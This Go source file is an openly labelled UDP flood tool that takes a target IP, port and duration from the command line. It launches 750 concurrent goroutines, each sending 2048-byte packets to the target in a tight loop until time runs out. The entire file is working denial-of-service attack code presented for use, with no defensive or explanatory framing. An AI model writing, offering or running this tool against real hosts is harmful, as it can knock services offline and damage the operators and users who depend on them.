package main

import (
	"fmt"
	"net"
	"os"
	"strconv"
	"sync"
	"time"
)

const payloadSize = 2048

func sendUDPPacket(wg *sync.WaitGroup, ip string, port int, duration time.Duration) {
	defer wg.Done()
	serverAddr, err := net.ResolveUDPAddr("udp4", fmt.Sprintf("%s:%d", ip, port))
	if err != nil {
		return
	}
	conn, err := net.DialUDP("udp4", nil, serverAddr)
	if err != nil {
		return
	}
	defer conn.Close()
	payload := make([]byte, payloadSize)
	endTime := time.Now().Add(duration)
	for time.Now().Before(endTime) {
		_, _ = conn.Write(payload)
	}
}

func main() {
	if len(os.Args) != 4 {
		fmt.Println("Usage: go run udp.go ip port time")
		return
	}
	ip := os.Args[1]
	port, err := strconv.Atoi(os.Args[2])
	if err != nil {
		return
	}
	duration, err := strconv.Atoi(os.Args[3])
	if err != nil {
		return
	}
	fmt.Printf("udpflood -> %s:%d :: %d seconds\n", ip, port, duration)
	threadCount := 750
	var wg sync.WaitGroup
	for i := 0; i < threadCount; i++ {
		wg.Add(1)
		go sendUDPPacket(&wg, ip, port, time.Duration(duration)*time.Second)
	}
	wg.Wait()
	fmt.Println("thank to using tool.")
}
